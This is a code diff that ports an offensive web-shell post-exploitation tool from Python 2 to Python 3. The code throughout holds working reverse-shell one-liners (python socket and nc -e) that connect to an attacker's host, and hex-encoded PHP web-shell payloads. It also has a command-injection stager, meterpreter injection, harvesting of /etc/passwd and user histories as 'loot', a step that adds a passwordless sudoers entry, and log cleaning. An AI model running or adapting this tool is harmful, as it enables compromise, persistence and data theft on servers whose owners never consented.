@@ -1,14 +1,37 @@
-#!/usr/bin/env python
-import os, sys, getopt, urllib, urllib2, re, socket, threading, time, binascii, hashlib, math, random, string, json, base64, zlib, textwrap, readline, signal, platform, dateutil
+#!/usr/bin/env python3
+import os
+import sys
+import getopt
+import urllib
+import urllib.request
+import re
+import socket
+import threading
+import time
+import binascii
+import hashlib
+import math
+import random
+import string
+import json
+import base64
+import zlib
+import textwrap
+import readline
+import signal
+import platform
+import dateutil
+import fcntl
+import errno
 
 ### TODO :: Add proxy support
 __author__ = "z0noxz"
 _gs = {
 	"_stager"				: "cmd",
-	"_var_exec"				: "SMPLSHLL_EXEC",
-	"_var_eval"				: "SMPLSHLL_EVAL",
-	"_var_sudo"				: "SMPLSHLL_SUDO",
-	"_var_sudo_prompt"		: "HTTP_SMPLSHLL_SUDO_PROMPT",
+	"_var_exec"				: "SMPLSHLLEXEC",
+	"_var_eval"				: "SMPLSHLLEVAL",
+	"_var_sudo"				: "SMPLSHLLSUDO",
+	"_var_sudo_prompt"		: "SMPLSHLLSUDOPROMPT",
 	
 	"dir_loot"				: ".ssc/{0}/.loot/{1}/",
 	"_is_sudo"				: False,
@@ -24,9 +47,9 @@ _gs = {
 	"working_directory"		: "",
 	
 	"reverse_shells": [
-		"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-		"nc -e /bin/sh {0} {1}",
-		"/bin/nc.traditional -e /bin/sh {0} {1}",
+		"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
+		"nc -e /bin/bash {0} {1}",
+		"/bin/nc.traditional -e /bin/bash {0} {1}",
 	],
 	
 	"payloads": {
@@ -35,8 +58,8 @@ _gs = {
 			"payload" : "3c3f7068702069662028697373657428245f4745545b22636d64225d2929207b206563686f207368656c6c5f6578656328245f4745545b22636d64225d293b206469653b207d203f3e"
 		},
 		"smplshll": {
-			"path" : "", 
-			"payload" : "66756e6374696f6e205f637279707428246b65792c2024737472696e672c2024616374696f6e203d2022656e637279707422290d0a7b0d0a0924726573203d2022223b0d0a090d0a096966202824616374696f6e20213d3d2022656e637279707422290d0a097b0d0a090924737472696e67203d206261736536345f6465636f64652824737472696e67293b0d0a097d0d0a090d0a09666f7220282469203d20303b202469203c207374726c656e2824737472696e67293b2024692b2b290d0a097b0d0a09092463203d206f7264287375627374722824737472696e672c20246929293b0d0a09090d0a09096966202824616374696f6e203d3d2022656e637279707422290d0a09097b0d0a0909092463202b3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0d0a09090924726573202e3d2063687228246320262030784646293b0d0a09097d0d0a0909656c73650d0a09097b0d0a0909092463202d3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0d0a09090924726573202e3d20636872286162732824632920262030784646293b0d0a09097d0d0a097d0d0a090d0a096966202824616374696f6e203d3d2022656e637279707422290d0a097b0d0a090924726573203d206261736536345f656e636f64652824726573293b0d0a097d0d0a090d0a0972657475726e20247265733b0d0a7d0d0a0d0a66756e6374696f6e2063616c6c6261636b2824627566666572290d0a7b0d0a0972657475726e20285f637279707428225f5f494e505f5053575f5f222c20246275666665722c2022656e63727970742229293b0d0a7d0d0a0d0a6f625f7374617274282263616c6c6261636b22293b0d0a0d0a69662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f4556414c225d29290d0a7b0d0a096576616c285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f534d504c53484c4c5f4556414c225d2c20225f5f494e505f5053575f5f2229293b0d0a096469653b0d0a7d0d0a0d0a69662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f45584543225d29290d0a7b0d0a096563686f207368656c6c5f65786563285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f534d504c53484c4c5f45584543225d2c20225f5f494e505f5053575f5f2229293b0d0a096469653b0d0a7d0d0a0d0a69662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f5355444f225d29290d0a7b0d0a09247069203d20617272617928293b0d0a09247072203d2070726f635f6f70656e285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f534d504c53484c4c5f5355444f225d2c20225f5f494e505f5053575f5f22292c206172726179286172726179282270697065222c20227222292c206172726179282270697065222c2022772229292c20247069293b0d0a090d0a0969662028697373657428245f5345525645525b22485454505f534d504c53484c4c5f5355444f5f50524f4d5054225d29290d0a097b0d0a0909667772697465282470697065735b305d2c205f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f534d504c53484c4c5f5355444f5f50524f4d5054225d2c20225f5f494e505f5053575f5f2229293b0d0a097d0d0a090d0a0966636c6f7365282470695b305d293b0d0a097072696e745f722873747265616d5f6765745f636f6e74656e7473282470695b315d29293b0d0a0970726f635f636c6f736528247072293b0d0a096469653b0d0a7d0d0a0d0a6f625f656e645f666c75736828293b"
+			"path" : "",
+			"payload" : "66756e6374696f6e205f637279707428246b65792c2024737472696e672c2024616374696f6e203d2022656e637279707422290a7b0a0924726573203d2022223b0a090a096966202824616374696f6e20213d3d2022656e637279707422290a097b0a090924737472696e67203d206261736536345f6465636f64652824737472696e67293b0a097d0a090a09666f7220282469203d20303b202469203c207374726c656e2824737472696e67293b2024692b2b290a097b0a09092463203d206f7264287375627374722824737472696e672c20246929293b0a09090a09096966202824616374696f6e203d3d2022656e637279707422290a09097b0a0909092463202b3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0a09090924726573202e3d2063687228246320262030784646293b0a09097d0a0909656c73650a09097b0a0909092463202d3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0a09090924726573202e3d20636872286162732824632920262030784646293b0a09097d0a097d0a090a096966202824616374696f6e203d3d2022656e637279707422290a097b0a090924726573203d206261736536345f656e636f64652824726573293b0a097d0a090a0972657475726e20247265733b0a7d0a0a66756e6374696f6e2063616c6c6261636b2824627566666572290a7b0a0972657475726e20285f637279707428225f5f494e505f5053575f5f222c20246275666665722c2022656e63727970742229293b0a7d0a0a6f625f7374617274282263616c6c6261636b22293b0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f4556414c5f5f225d29290a7b0a096576616c285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f4556414c5f5f225d2c20225f5f494e505f5053575f5f2229293b0a096469653b0a7d0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f455845435f5f225d29290a7b0a096563686f207368656c6c5f65786563285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f455845435f5f225d2c20225f5f494e505f5053575f5f2229293b0a096469653b0a7d0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f5f225d29290a7b0a09247069203d20617272617928293b0a09247072203d2070726f635f6f70656e285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f5f225d2c20225f5f494e505f5053575f5f22292c206172726179286172726179282270697065222c20227222292c206172726179282270697065222c2022772229292c20247069293b0a090a0969662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f50524f4d50545f5f225d29290a097b0a0909667772697465282470697065735b305d2c205f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f50524f4d50545f5f225d2c20225f5f494e505f5053575f5f2229293b0a097d0a090a0966636c6f7365282470695b305d293b0a097072696e745f722873747265616d5f6765745f636f6e74656e7473282470695b315d29293b0a0970726f635f636c6f736528247072293b0a096469653b0a7d0a0a6f625f656e645f666c75736828293b"
 		}
 	},
 	
@@ -58,7 +81,7 @@ help_notes = """
     --url                 Shell interface URL without paramters (e.g. "http://www.site.com/simple-shell.php")
     
     --post                Declare POST data (eg. "{'submit':'','ip':_INJECT_}")
-    --get                 Declare GET data (eg. "?ip=_INJECT_")
+    --get                 Declare GET data (eg. "{'ip':_INJECT_}")
     --cookies             Declare COOKIE data (eg. "PHPSESSID=deadbeefdeadbeefdeadbeefdeadbeef")
 
     Shell commands:
@@ -87,6 +110,9 @@ class Print(object):
 		return len(text)
 		
 	@staticmethod
+	def debug(text = ""): return Print.text("debug :: " + text)
+		
+	@staticmethod
 	def info(text = "", continuous = False): return Print.text("\033[94m[i]\033[0m " + text, continuous)
 		
 	@staticmethod
@@ -104,7 +130,7 @@ class Print(object):
 	@staticmethod
 	def confirm(text = ""): 
 		Print.text("\033[38;5;133m[?] " + text + " (Y/n): \033[0m", True)
-		return not (raw_input()).lower() in ["n", "no"]
+		return not (input().strip()).lower() in ["n", "no"]
 		
 		
 	@staticmethod
@@ -127,22 +153,22 @@ class Print(object):
 		
 		hr_width = (sum(max_headers) + ((len(max_headers) - 1) * 2))
 		
-		if caption <> "":
+		if caption != "":
 			Print.text(caption.center(hr_width))
 			Print.text("=" * hr_width)
 			
-		if description <> "":
+		if description != "":
 			Print.text(textwrap.fill(description, width = hr_width, initial_indent = "", subsequent_indent = "  "))
 			Print.text()
 		
-		if "".join(headers) <> "":
+		if "".join(headers) != "":
 			Print.text("  ".join(headers[i] + (" " * (max_headers[i] - len(headers[i]))) for i in range(0, len(headers))))
 			Print.text("  ".join(("-" * (max_headers[i])) for i in range(0, len(headers))))
 				
 		for row in rows:
 			Print.text("  ".join(str(row[i]) + (" " * (max_headers[i] - len(str(row[i])))) for i in range(0, len(headers))))
 			
-			if "list" in row.keys() and row["list"] <> None:
+			if "list" in row.keys() and row["list"] != None:
 				index = row["list"]["index"]
 				array = row["list"]["array"]
 				
@@ -160,15 +186,23 @@ class Utility(object):
 	
 	@staticmethod
 	def crypt(key, data, encrypt = True):
-		result = ""
+		result = bytearray()
 
-		for i, c in enumerate(data if encrypt else base64.b64decode(data)):
+		for i, c in enumerate(data if encrypt else base64.b64decode(data)):			
 			if encrypt: 
-				result += chr(ord(c) + ord(key[((i + 1) % len(key)):][:1]) & 0xff)
+				result.append(int(ord(c) + ord(key[((i + 1) % len(key)):][:1]) & 0xff))
 			else: 
-				result += chr(abs(ord(c) - ord(key[((i + 1) % len(key)):][:1])) & 0xff)
-
-		return base64.b64encode(result) if encrypt else result
+				result.append(int(abs(c - ord(key[((i + 1) % len(key)):][:1])) & 0xff))
+				
+		return base64.b64encode(result).decode("utf-8") if encrypt else "".join(chr(c) for c in result)
+	
+	@staticmethod
+	def hexToStr(h):
+		return bytes.fromhex(h).decode("utf-8")
+	
+	@staticmethod
+	def strToHex(s):
+		return binascii.hexlify(s.encode("utf-8")).decode("utf-8")
 	
 	@staticmethod
 	def ip4_addresses():
@@ -178,7 +212,7 @@ class Utility(object):
 	def loot_name(sufix, sub_dir = ""):
 		_dir = _gs["dir_loot"]
 		
-		if sub_dir <> "": _dir += sub_dir
+		if sub_dir != "": _dir += sub_dir
 		if not os.path.exists(_dir): os.makedirs(_dir)
 
 		return _dir + time.strftime("%Y%m%d%H%M%S") + "_" + sufix
@@ -223,7 +257,7 @@ class Utility(object):
 	def get_os(interactor = None):
 		_system = platform.system() # Gets local platform
 		
-		if interactor <> None:
+		if interactor != None:
 			if interactor("uname -s").strip().lower() in ["sunos", "aix", "linux"]: _system = "linux"
 			elif "windows" in interactor("ver").strip().lower(): _system = "windows"
 			else: _system = "undefined"
@@ -235,19 +269,19 @@ class PHPInteractor(object):
 	
 	@staticmethod
 	def send(url, headers, timeout):
-		request = urllib2.Request(url)
+		request = urllib.request.Request(url)
 		data = ""
 		
 		# Add password key
 		request.add_header(_gs["smplshll_main_password_var"], _gs["smplshll_main_password"])
-				
+					
 		for header in headers.keys():
 			request.add_header(header, Utility.crypt(_gs["smplshll_input_password"], headers[header]))
-			
+		
 		if timeout > 0:
-			data = urllib2.urlopen(request, timeout = timeout).read()
+			data = urllib.request.urlopen(request, timeout = timeout).read()
 		else:
-			data = urllib2.urlopen(request).read()
+			data = urllib.request.urlopen(request).read()
 
 		return Utility.crypt(_gs["smplshll_input_password"], data, False) if _gs["smplshll_response_encryption"] else data
 	
@@ -284,7 +318,7 @@ class MandoCommand(object):
 	def mc_sudo(match):
 		if _gs["_is_sudo"]:
 			result = PHPInteractor.sudo_command("sudo " + match.group(1))
-			if result.strip() <> "":
+			if result.strip() != "":
 				for x in result.strip().split("\n"): Print.text(x)
 			else:
 				Print.info("No output")
@@ -300,7 +334,7 @@ class MandoCommand(object):
 	@staticmethod
 	def mc_interact(match):
 		session = SessionManager.select(int(match.group(1)))
-		if session <> None: session.interact()
+		if session != None: session.interact()
 		
 	@staticmethod
 	def mc_meterpreter(match):
@@ -320,10 +354,10 @@ class MandoCommand(object):
 			MandoCommand.mc_meterpreter_state = -1
 
 		Print.info("Injecting meterpreter payload through PHP evaluation")
-		threading.Thread(target = injector, args = (payload.decode("hex"), )).start()
+		threading.Thread(target = injector, args = (Utility.hexToStr(payload), )).start()
 		
 		while True:
-			if MandoCommand.mc_meterpreter_state <> 0:				
+			if MandoCommand.mc_meterpreter_state != 0:				
 				Print.success("Meterpreter injection succeeded") if MandoCommand.mc_meterpreter_state == 1 else Print.error("Meterpreter injection failed")				
 				break
 		
@@ -335,7 +369,7 @@ class MandoCommand(object):
 		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
 		
 		Print.info("Executing as '" + user + "'")
-		if user <> "root": Print.warning("For best effect, this should be executed as root")
+		if user != "root": Print.warning("For best effect, this should be executed as root")
 		Print.text()
 		
 		users = Utility.self_or_sudo("/bin/cat /etc/passwd | cut -d : -f 1").strip().split("\n")
@@ -344,7 +378,7 @@ class MandoCommand(object):
 		counter = 0
 		
 		Print.status("Retrieving history for " + str(len(users)) + " users")
-		print ""
+		print("")
 
 		for user in users:
 			counter += 1
@@ -365,7 +399,7 @@ class MandoCommand(object):
 						history = Utility.self_or_sudo("cat " + application_file).strip()
 						Utility.save_loot(user + ".applicaiton_history." + application_file, history, "user_history/")
 			if counter < len(users):
-				print ""
+				print("")
 
 	@staticmethod
 	def mc_gather_system_info(match):
@@ -374,7 +408,7 @@ class MandoCommand(object):
 		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
 		
 		Print.info("Executing as '" + user + "'")
-		if user <> "root": Print.warning("For best effect, this should be executed as root")
+		if user != "root": Print.warning("For best effect, this should be executed as root")
 		Print.info("Identified the system to be '" + dist + "'")
 		Print.text()
 		
@@ -436,7 +470,7 @@ class MandoCommand(object):
 		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
 		
 		Print.info("Executing as '" + user + "'")
-		if user <> "root": Print.warning("For best effect, this should be executed as root")
+		if user != "root": Print.warning("For best effect, this should be executed as root")
 		Print.text()
 		
 		configs = [
@@ -524,12 +558,12 @@ class MandoCommand(object):
 		elif _gs["system"] == Utility.os.WINDOWS: 
 			wd = PHPInteractor.command("echo %cd%").strip()
 			
-		if match <> None: Print.text(wd)		
+		if match != None: Print.text(wd)		
 		return wd
-			
+
 	@staticmethod
 	def mc_ls(match = None):
-		from dateutil.parser import *
+		#import dateutil.parser
 		
 		dir = []
 		Print.text()
@@ -543,7 +577,7 @@ class MandoCommand(object):
 				
 				dir.append({
 					0 : x[0],
-					1 : Utility.filesize(int(x[2] if x[2] <> "" else 0)).rjust(16),
+					1 : Utility.filesize(int(x[2] if x[2] != "" else 0)).rjust(16),
 					2 : "dir" if x[2] == "" else x[3][x[3].rfind(".") + 1:] if "." in x[3] else "n/a",
 					3 : "{0}-{1:02}-{2:02} {3:02}:{4:02}".format(dt.year, dt.month, dt.day, dt.hour, dt.minute),
 					4 : x[3]
@@ -562,7 +596,7 @@ class MandoCommand(object):
 
 		Print.text("")
 		Print.info("Executing as '" + user + "'")
-		if user <> "root": Print.warning("For best effect, this should be executed as root")
+		if user != "root": Print.warning("For best effect, this should be executed as root")
 		Print.info("Enumerating and collecting network data...")
 		Print.text()
 
@@ -598,7 +632,7 @@ class MandoCommand(object):
 			"arp"			: [arp],
 		}.iteritems():
 			result = "\n".join(action() if hasattr(action, "__call__") else Utility.self_or_sudo(action).strip() for action in actions)
-			Utility.save_loot("network." + operation, result, "network_info/") if result <> "" else Print.error(operation + " returned empty")
+			Utility.save_loot("network." + operation, result, "network_info/") if result != "" else Print.error(operation + " returned empty")
 
 		Print.text("")
 
@@ -612,7 +646,7 @@ class MandoCommand(object):
 		print("  This program simply uploads a file to the target server")
 		print("")
 		
-		lpath = raw_input("  Local path: ")
+		lpath = input("  Local path: ")
 		file_name = lpath[lpath.rfind("/") + 1:]
 		
 		sys.stdout.write("\n  Initializing..................................................")
@@ -642,10 +676,10 @@ class MandoCommand(object):
 					local_hash_md5.update(chunk)
 
 					if chunk:				
-						chunk = binascii.hexlify(chunk)
-						chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
+						chunk = binascii.hexlify(chunk).decode("utf-8")
+						chunk = "0x" + "0x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
 
-						PHPInteractor.command("cd " + _gs["working_directory"] + " && echo -n -e '" + chunk + "' >> " + file_name)
+						PHPInteractor.command("cd " + _gs["working_directory"] + " && echo '" + chunk + "' >> " + file_name)
 
 						if ((counter / (chunk_count / progress_width)) > step):
 							sys.stdout.write(".")
@@ -654,21 +688,35 @@ class MandoCommand(object):
 						counter += 1
 					else:
 						break
+						
+				# Remove line breaks, and last byte (0a: line break)
+				PHPInteractor.command("cd " + _gs["working_directory"] + " && sed -i -- ':a;N;$!ba;s/\\n//g' " + file_name + " && truncate -s-1 " + file_name)
 
 				sys.stdout.write("\b" * (step - 1))
 				sys.stdout.flush()
 				sys.stdout.write(("." * (progress_width - 3)))
+				print("[\033[92mOK\033[0m]")				
+				
+				sys.stdout.write("  finalizing....................................................")
+				sys.stdout.flush()
+				
+				# Replace each hex representative
+				for i in range(256):
+					PHPInteractor.command("cd " + _gs["working_directory"] + "&& sed -i -- 's/0x" + str("%0.2x" % i) + r"/\x" + str("%0.2x" % i) + "/g' " + file_name)
+
 				print("[\033[92mOK\033[0m]")
 				
 				sys.stdout.write("  Analysing file integrity......................................")
 				sys.stdout.flush()
 				print("[\033[92mOK\033[0m]" if (str(PHPInteractor.command("cd " + _gs["working_directory"] + " && md5sum " + file_name + " | awk '{ print $1 }'")).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
 		except:
+			import traceback
+			print(traceback.format_exc())
 			print("\n  \033[91mError: cannot open '" + file_name + "'\033[0m")
 
 	@staticmethod
 	def mc_php_variables(match):
-		PHPInteractor.eval("print_r(get_defined_vars());")
+		print(PHPInteractor.eval("print_r(get_defined_vars());"))
 			
 	@staticmethod	
 	def mc_php_eval(match):
@@ -680,13 +728,13 @@ class MandoCommand(object):
 		print("  This program evaluats PHP code")
 		print("")
 			
-		PHPInteractor.eval(raw_input("  PHP Code: "))
+		print("  ------------------------------------------------------------------\n  " + PHPInteractor.eval(input("  PHP Code: ")))
 			
 	@staticmethod
 	def mc_file_download(match, path = None):
 		global _gs
 
-		rpath = (path if path <> None else match.group(1))
+		rpath = (path if path != None else match.group(1))
 		file_name = Utility.loot_name(rpath[rpath.rfind("/") + 1:])
 		
 		try:
@@ -735,7 +783,7 @@ class MandoCommand(object):
 					local_hash_md5.update(_file.read())
 
 				print("[\033[92mOK\033[0m]" if (str(PHPInteractor.command("cd " + _gs["working_directory"] + " && md5sum " + rpath + " | awk '{ print $1 }'")).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
-				print "  Loot saved at: \033[92m" + file_name + "\033[0m"
+				print("  Loot saved at: \033[92m" + file_name + "\033[0m")
 			else:
 				Print.error("Cannot access the file")
 		except:
@@ -885,6 +933,11 @@ class MandoCommand(object):
 				# attack/su_crack [using PHPInteractor.sudo_command_prompt("su -c whoami USERNAME", "PASSWORD", False)]
 				# attack/www_to_root [tries different attacks to 'automatically' elevate www-data to root or/sudo]
 				
+				
+	#				attack/su_crack [using PHPInteractor.sudo_command_prompt("su -c whoami USERNAME", "PASSWORD", False)]
+	#				attack/www_to_root [tries different attacks to 'automatically' elevate www-data to root or/sudo]
+	#					: https://blog.sucuri.net/2013/07/from-a-site-compromise-to-full-root-access-bad-server-management-part-iii.html
+				
 				"gather/network_info": {
 					"description"	: "Gathers network information",
 					"validation"	: "gather\/network_info",
@@ -951,14 +1004,14 @@ class MandoCommand(object):
 			command_name = x.split(" ")[0]
 			function = MandoCommand.get(command_name) if command_name in MandoCommand.commands() else None
 
-			if function <> None:
+			if function != None:
 				if hasattr(function["run"], "__call__") and re.compile(function["validation"]).match(x):
 					function["run"](re.compile(function["validation"]).match(x))
 				else:
 					Print.text()
 					match = re.compile(function["validation"]).match(x)
 						
-					if match and match.group(1) <> None and match.group(1).strip() in MandoCommand.commands():
+					if match and match.group(1) != None and match.group(1).strip() in MandoCommand.commands():
 						for x in MandoCommand.get(match.group(1).strip())["help"].split("\n"): Print.text(x)
 					else:
 						Print.table(
@@ -1013,7 +1066,7 @@ class SessionManager(object):
 	def select(id = None):
 		SessionManager.init()
 		
-		if id <> None and id in _gs["_sessions"].keys():
+		if id != None and id in _gs["_sessions"].keys():
 			return _gs["_sessions"][id]["record"]
 		else:
 			Print.table(
@@ -1045,11 +1098,30 @@ class Shell(object):
 	
 	def send(self, input = None):
 		
-		if self.connection <> None:		
-			if input <> None:
-				self.connection.send(input + "\r")
-				time.sleep(0.5)
-				result = self.connection.recv(16834).split("\n")
+		if self.connection != None:		
+			if input != None:
+				counter = 0
+				fcntl.fcntl(self.connection, fcntl.F_SETFL, os.O_NONBLOCK)
+				self.connection.send((input + "\r").encode("utf-8"))
+				#time.sleep(0.5)
+								
+				while True:
+					try:
+						result = self.connection.recv(16834).decode("utf-8").split("\n")
+					except socket.error as e:
+						err = e.args[0]
+						if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
+							if counter == 10:
+								Print.error("No response, aborting")
+								return ""
+							time.sleep(0.2)
+							counter += 1
+							continue
+						else:
+							print(e)
+							sys.exit(1)
+					else:
+						break
 
 				return "\n".join(result[1:-1]).strip()
 			else:
@@ -1095,7 +1167,7 @@ class Shell(object):
 			time.sleep(1)
 			for payload in _gs["reverse_shells"]:
 				pid = PHPInteractor.command(payload.format(lhost, lport) + " & echo $!").strip()
-				if PHPInteractor.command("ps --pid " + pid + " -o comm=") <> "":
+				if PHPInteractor.command("ps --pid " + pid + " -o comm=") != "":
 					shell.pids.append(int(pid))
 					break
 		
@@ -1122,6 +1194,7 @@ class Shell(object):
 					Print.success("Successfully spawned tty"				
 					return True
 				'''
+				
 				## Try to spawn tty
 				self.send(spawner)
 				
@@ -1166,7 +1239,7 @@ class Shell(object):
 					for payload in _gs["reverse_shells"]:
 						pid = self.send(payload.format(local_options["LHOST"], local_options["LPORT"]) + " & echo $!").strip()
 						
-						if self.send("ps --pid " + pid + " -o comm=").split("\n")[0].strip() <> "":
+						if self.send("ps --pid " + pid + " -o comm=").split("\n")[0].strip() != "":
 							Print.success("Successfully spawned reverse shell")
 							return
 					Print.error("Failed to spawn reverse shell")			
@@ -1189,7 +1262,7 @@ class Shell(object):
 						pid = self.send(payload + " & echo $!")
 						pid = int(str(pid.split("\n")[1]).strip()) + 1
 						
-						if self.send("ps --pid " + str(pid) + " -o comm=").split("\n")[0].strip() <> "":
+						if self.send("ps --pid " + str(pid) + " -o comm=").split("\n")[0].strip() != "":
 							Print.success("Successfully spawned meterpreter shell")
 						else:
 							Print.error("Failed to spawn meterpreter shell")
@@ -1297,7 +1370,7 @@ class Shell(object):
 						if self.send("grep -c '^" + local_options["USERNAME"] + ":' /etc/passwd").strip() == "1":
 							
 							Print.status("Trying add " + local_options["USERNAME"] + " to sudo")
-							sudo = (True if self.send("whoami") <> "root" else False)
+							sudo = (True if self.send("whoami") != "root" else False)
 							self.send(("sudo " if sudo else "") + "adduser " + local_options["USERNAME"] + " sudo")
 							self.send(("sudo " if sudo else "") + "echo '" + local_options["USERNAME"] + " ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")							
 
@@ -1350,7 +1423,7 @@ class Shell(object):
 										tmp = "/tmp/" + "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
 										self.send("sed -e 's/" + target + "/" + replacement + "/g' " + file + " > " + tmp + "; mv -f " + tmp + " " + file)
 
-									if self.send("grep -Fq '" + target + "' " + file + " && echo 'ok'") <> "ok":
+									if self.send("grep -Fq '" + target + "' " + file + " && echo 'ok'") != "ok":
 										Print.success(file + " is clean")
 									else:
 										Print.error("Failed to clean " + file)
@@ -1385,7 +1458,7 @@ class Shell(object):
 						for i in range(0, len(users)):
 							Print.text("[" + str(i) + "] " + users[i])
 						
-						selection = raw_input("  User(s), separate index with comma: ")
+						selection = input("  User(s), separate index with comma: ")
 						
 						passwords = [
 							lambda x: x,
@@ -1419,7 +1492,7 @@ class Shell(object):
 					if not self.tty:
 						Print.error("This command needs tty")
 					else:
-						sudo = (True if self.send("whoami") <> "root" else False)
+						sudo = (True if self.send("whoami") != "root" else False)
 						
 						if ((sudo and self.send("sudo -u root whoami") == "root") or (not sudo)):
 							dump = ""
@@ -1635,7 +1708,7 @@ class Shell(object):
 			
 			@staticmethod
 			def get(key = None):
-				return RunCommands.definition()[key if key <> None else self.selected_command]
+				return RunCommands.definition()[key if key != None else self.selected_command]
 			
 			@staticmethod
 			def get_options():
@@ -1646,7 +1719,7 @@ class Shell(object):
 			
 			@staticmethod
 			def is_selected():
-				return True if self.selected_command <> None and self.selected_command in RunCommands.commands() else False
+				return True if self.selected_command != None and self.selected_command in RunCommands.commands() else False
 					
 			@staticmethod
 			def validate(command):
@@ -1685,14 +1758,14 @@ class Shell(object):
 				else:
 					self.selected_command = None
 
-					print "  Select one of the following commands:"
-					print "  -> " + "\n  -> ".join(sorted(RunCommands.commands()))
+					print("  Select one of the following commands:")
+					print("  -> " + "\n  -> ".join(sorted(RunCommands.commands())))
 			
 			@staticmethod
 			def sc_set(match):
 				if match:
 					self.option_values[match.group(1).upper()] = match.group(2)
-					print "  " + match.group(1).upper() + " => " + match.group(2)
+					print("  " + match.group(1).upper() + " => " + match.group(2))
 				else:
 					Print.error("A name and a value must be defined")
 					
@@ -1731,7 +1804,7 @@ class Shell(object):
 					self.send("")
 					
 					command = RunCommands.get()
-					if command["run"] <> None:
+					if command["run"] != None:
 						command["run"](command)
 				else:
 					Print.error("There is no command selected")
@@ -1822,7 +1895,7 @@ class Shell(object):
 		
 		while True:
 			try:
-				_input = raw_input("\033[4mShell\033[0m" + ("(\033[94mtty\033[0m)" if self.tty else "") + (" use(\033[91m" + self.selected_command + "\033[0m)" if self.selected_command else "") + " > ")
+				_input = input("\033[4mShell\033[0m" + ("(\033[94mtty\033[0m)" if self.tty else "") + (" use(\033[91m" + self.selected_command + "\033[0m)" if self.selected_command else "") + " > ")
 				_input_command = _input.split(" ")[0]
 				
 				if _input_command == "exit": self.close();	
@@ -1832,10 +1905,10 @@ class Shell(object):
 				## Check if command
 				if _input_command in ShellCommands.commands():
 					
-					if not _input_command == "use": print ""						
+					if not _input_command == "use": print("")						
 						
 					command = ShellCommands.get(_input_command)
-					if command["run"] <> None:
+					if command["run"] != None:
 						command["run"](re.compile(command["validation"]).match(_input))
 					
 					if command["state"] == self.interact_state.BREAK: break
@@ -1843,7 +1916,7 @@ class Shell(object):
 				else:
 					#Print.text(self.send(_input))
 					for x in self.send(_input).strip().split("\n"): Print.text(x)
-				print ""
+				print("")
 				
 			except:
 				self.close()
@@ -1896,10 +1969,10 @@ class CommandInjector(object):
 
 					if chunk:
 						if _gs["system"] == Utility.os.LINUX:
-							chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
-							urllib2.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.quote_plus("echo -n -e '" + chunk + "' >> " + path))).read()
+							chunk = "0x" + "0x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])
+							urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("echo '" + chunk + "' >> " + path))).read()
 						elif _gs["system"] == Utility.os.WINDOWS:					
-							urllib2.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.quote_plus("<nul set /p \".=" + chunk.decode("hex").replace("\"", "'") + "\" >> " + path))).read()
+							urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("<nul set /p \".=" + chunk.decode("hex").replace("\"", "'") + "\" >> " + path))).read()
 
 						tl = Print.status("Sending stage: {:.0%}".format((counter - 1) / chunk_count), True)
 						Print.text(("\b" * tl), True)
@@ -1907,36 +1980,44 @@ class CommandInjector(object):
 						counter += 1
 					else:
 						break
+				
+				# Remove line breaks
+				urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("sed -i -- ':a;N;$!ba;s/\\n//g' " + path))).read()
+				
+				# Replace each hex representative
+				for i in range(256):
+					urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\x" + str("%0.2x" % i) + "/g' " + path))).read()
 				Print.text((tl - Print.success("Payload injected through stager", True)) * " ")
 
 			except:
 				Print.text((tl - Print.error("Failed to inject payload", True)) * " ")
+				sys.exit(2)
 			finally:	
